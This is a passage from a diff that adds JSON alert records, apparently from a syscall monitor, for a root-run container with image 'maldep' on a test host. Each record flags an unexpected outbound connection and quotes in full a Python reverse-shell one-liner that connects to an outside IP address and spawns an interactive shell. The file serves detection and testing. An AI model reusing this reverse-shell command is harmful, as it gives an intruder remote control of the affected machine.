+      "output": "09:07:32.495015301: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22943)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:42240->77.244.210.247:22943 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "evt.time": "09:07:32.997735355",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:53972->77.244.210.247:22944",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22944)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752852",
+        "nanos": 997735355
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:32.997735355: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22944)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:53972->77.244.210.247:22944 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:33.443922495",
+        "fd.name": "0.0.0.0:51744->77.244.210.247:22945",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22945)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752853",
+        "nanos": 443922495
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:33.443922495: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22945)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:51744->77.244.210.247:22945 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22946)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:41230->77.244.210.247:22946",
+        "evt.time": "09:07:33.819630936",
+        "user.name": "root",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752853",
+        "nanos": 819630936
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:33.819630936: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22946)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:41230->77.244.210.247:22946 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "fd.name": "0.0.0.0:38894->77.244.210.247:22947",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22947)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:34.246066226"
+      },
+      "time": {
+        "seconds": "1764752854",
+        "nanos": 246066226
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:34.246066226: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22947)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:38894->77.244.210.247:22947 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "fd.name": "0.0.0.0:35338->77.244.210.247:22948",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22948)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:34.738700162",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752854",
+        "nanos": 738700162
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:34.738700162: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22948)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:35338->77.244.210.247:22948 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22949)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:47778->77.244.210.247:22949",
+        "evt.time": "09:07:35.112048637",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752855",
+        "nanos": 112048637
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:35.112048637: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22949)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:47778->77.244.210.247:22949 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:35.525822780",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:54500->77.244.210.247:22950",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22950)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752855",
+        "nanos": 525822780
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:35.525822780: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22950)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:54500->77.244.210.247:22950 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:36.018037663",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:39652->77.244.210.247:22951",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22951)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752856",
+        "nanos": 18037663
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:36.018037663: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22951)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:39652->77.244.210.247:22951 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:42170->77.244.210.247:22952",
+        "evt.time": "09:07:36.391197184",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22952)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752856",
+        "nanos": 391197184
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:36.391197184: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22952)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:42170->77.244.210.247:22952 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:48116->77.244.210.247:22953",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22953)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "evt.time": "09:07:36.811299448",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752856",
+        "nanos": 811299448
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:36.811299448: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22953)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:48116->77.244.210.247:22953 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22954)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:50894->77.244.210.247:22954",
+        "evt.time": "09:07:37.144245521"
+      },
+      "time": {
+        "seconds": "1764752857",
+        "nanos": 144245521
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:37.144245521: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22954)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:50894->77.244.210.247:22954 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22955)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "evt.time": "09:07:37.476764355",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:38102->77.244.210.247:22955"
+      },
+      "time": {
+        "seconds": "1764752857",
+        "nanos": 476764355
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:37.476764355: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22955)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:38102->77.244.210.247:22955 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "evt.time": "09:07:37.930047619",
+        "fd.name": "0.0.0.0:42874->77.244.210.247:22956",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22956)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752857",
+        "nanos": 930047619
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:37.930047619: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22956)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:42874->77.244.210.247:22956 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    }
+  ]
+}
